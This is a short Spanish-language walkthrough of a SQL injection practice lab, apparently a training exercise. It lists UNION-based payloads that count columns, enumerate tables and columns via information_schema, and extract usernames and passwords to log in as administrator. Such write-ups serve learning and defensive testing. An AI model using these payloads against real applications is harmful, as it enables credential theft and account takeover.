Tenemos el siguiente laboratorio:
![[Pasted image 20240517091323.png]]
Lo primero será determinar el número de columnas de la tabla, donde hay 2:
```bash
'+UNION+SELECT+NULL,NULL--
```
![[Pasted image 20240517091241.png]]
Ahora, vamos a conocer el listado de las tablas de la base de datos:
```bash
Gifts'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
![[Pasted image 20240517091412.png]]
Vemos la siguiente tabla de usuarios:
![[Pasted image 20240517092640.png]]
Y ahora para conocer las columnas de alguna de estas tablas, usamos el siguiente payload:
```bash
Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gayrfn'--
```
Y obtenemos los nombres de usuario:
![[Pasted image 20240517092904.png]]
Ahora que ya tenemos tanto el usuario como la contraseña, hacemos la siguiente query:
```bash
category=Gifts%27+UNION+SELECT+username_blbvyc,password_kxmhvv+from+users_gayrfn--
```
![[Pasted image 20240517093322.png]]
Y vemos también la contraseña del usuario administrator:
![[Pasted image 20240517093354.png]]
Nos logueamos y ya hemos resuelto el laboratorio:
![[Pasted image 20240517093419.png]]
